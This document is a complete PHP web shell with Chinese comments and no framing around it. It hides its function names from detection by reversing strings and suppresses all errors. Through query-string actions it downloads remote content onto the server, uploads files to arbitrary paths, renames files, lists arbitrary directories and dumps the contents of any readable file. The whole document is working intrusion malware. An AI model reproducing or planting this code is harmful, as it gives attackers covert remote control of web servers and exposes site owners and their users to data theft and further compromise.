<?php
error_reporting(0);
$sr="strrev";  //strrev()字符串反转函数
$id=$sr("rid_si");  //is_dir
$rn=$sr("emaner");  //rename
$dn=$sr("emanrid");  //dirname
$od=$sr("ridnepo");  //opendir
$rd=$sr("riddaer");  //readdir
$cd=$sr("ridesolc");  //closedir
$fpc=$sr("stnetnoc_tup_elif");  //file_put_contents
$fgc=$sr("stnetnoc_teg_elif");  //file_get_contents
$muf=$sr("elif_dedaolpu_evom");  //move_uploaded_file
$dlform='<form method="post">FN:<input name="fn" size="20" type="text">URL:<input name="url" size="50" type="text"><input type="submit" value="ok"></form>';
$ulform='<form method="post" enctype="multipart/form-data"><input name="uf" type="file">SP:<input name="sp" size="50" type="text"><input type="submit" value="ok"></form>';
$rnform='<form method="post">ON:<input name="on" size="50" type="text">NN:<input name="nn" size="50" type="text"><input type="submit" value="ok"></form>';
$lpform='<form method="post">DP:<input name="dp" size="50" type="text"><input type="submit" value="ok"></form>';
$sfform='<form method="post">DF:<input name="df" size="50" type="text"><input type="submit" value="ok"></form>';
if($_GET['act']=='dl'){  //下载文件
	echo($dlform);
	if($_SERVER['REQUEST_METHOD']=='POST'){
		$fpc($_POST['fn'],$fgc($_POST['url']));
	}
	exit;
}
if($_GET['act']=='ul'){  //上传文件
	echo($ulform);
	if($_SERVER['REQUEST_METHOD']=='POST'){
		$sp=empty($_POST['sp'])?'./':$_POST['sp'].'/';
		$muf(${"_F"."IL"."ES"}["uf"]["tmp_name"],$sp.${"_F"."IL"."ES"}["uf"]["name"]);
	}
	exit;
}
if($_GET['act']=='rn'){  //重命名文件
	echo($rnform);
	if($_SERVER['REQUEST_METHOD']=='POST'){
		$rn($_POST['on'],$_POST['nn']);
	}
	exit;
}
if($_GET['act']=='gp'){  //列出当前文件路径
	echo($dn(__FILE__));
	exit;
}
if($_GET['act']=='lp'){  //列出指定目录内容
		echo($lpform);
		if($_SERVER['REQUEST_METHOD']=='POST'){
			$dp=$_POST['dp'].'/';
			$h=$od($dp);
			while(($fn=$rd($h))!==false){
				if($id($dp.$fn)){$t1.='D&nbsp;'.$fn.'<br>';
			}else{
				$t2.='&nbsp;&nbsp;'.$fn.'<br>';
			}
		}
		$cd($dp);
		echo($dp.'<br>'.$t1.$t2);
	}exit;
}
if($_GET['act']=='sf'){  //获取文件内容
	echo($sfform);
	if($_SERVER['REQUEST_METHOD']=='POST'){
		$df=$_POST['df'];
		echo('<textarea style="width:100%;height:100%;" wrap="off">'.$fgc($df).'</textarea>');
	}exit;
}
